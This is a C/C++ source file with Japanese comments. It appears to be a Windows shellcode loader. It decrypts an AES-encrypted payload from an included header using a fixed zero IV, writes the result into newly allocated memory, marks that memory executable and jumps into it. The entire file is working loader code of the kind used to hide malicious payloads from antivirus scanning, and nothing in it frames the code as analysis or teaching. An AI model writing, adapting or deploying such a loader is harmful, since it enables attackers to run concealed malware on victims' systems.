#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include "payload.h"

#pragma comment(lib, "bcrypt.lib")

bool aesDecrypt(const BYTE* encrypted, DWORD encrypted_len, const BYTE* key, DWORD key_len, BYTE** out, DWORD* out_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbKeyObject = 0, cbData = 0, cbPlainText = 0;
    PBYTE pbKeyObject = NULL;
    BYTE iv[16] = { 0 };  // IV は固定で 0 埋め（暗号化側と一致させること）

    *out = NULL;
    *out_len = 0;

    // AES アルゴリズムハンドルを開く
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return false;

    // 鍵オブジェクトサイズを取得
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    pbKeyObject = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (!pbKeyObject) goto cleanup;

    // 鍵ハンドルを作成
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PUCHAR)key, key_len, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    // 出力サイズを取得
    status = BCryptDecrypt(hKey, (PUCHAR)encrypted, encrypted_len, NULL, iv, sizeof(iv), NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    *out = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (!*out) goto cleanup;

    status = BCryptDecrypt(hKey, (PUCHAR)encrypted, encrypted_len, NULL, iv, sizeof(iv), *out, cbPlainText, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        HeapFree(GetProcessHeap(), 0, *out);
        *out = NULL;
        goto cleanup;
    }

    *out_len = cbPlainText;

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
    return true;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);
    return false;
}

int main()
{
    BYTE* decrypted = NULL;
    DWORD decrypted_len = 0;

    if (!aesDecrypt(payload, payload_len, AES_KEY, sizeof(AES_KEY), &decrypted, &decrypted_len)) {
        printf("AES decrypt failed.\n");
        return 1;
    }

    HANDLE h_process = GetCurrentProcess();
    void* runtime = VirtualAllocEx(h_process, NULL, decrypted_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!runtime) {
        printf("VirtualAllocEx failed: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, decrypted);
        return 1;
    }

    RtlMoveMemory(runtime, decrypted, decrypted_len);

    DWORD old_protect = 0;
    if (!VirtualProtectEx(h_process, runtime, decrypted_len, PAGE_EXECUTE_READ, &old_protect)) {
        printf("VirtualProtectEx failed: %d\n", GetLastError());
        VirtualFreeEx(h_process, runtime, 0, MEM_RELEASE);
        HeapFree(GetProcessHeap(), 0, decrypted);
        return 1;
    }

    auto runFunc = reinterpret_cast<void(*)()>(runtime);
    runFunc();

    VirtualFreeEx(h_process, runtime, 0, MEM_RELEASE);
    HeapFree(GetProcessHeap(), 0, decrypted);

    return 0;
}
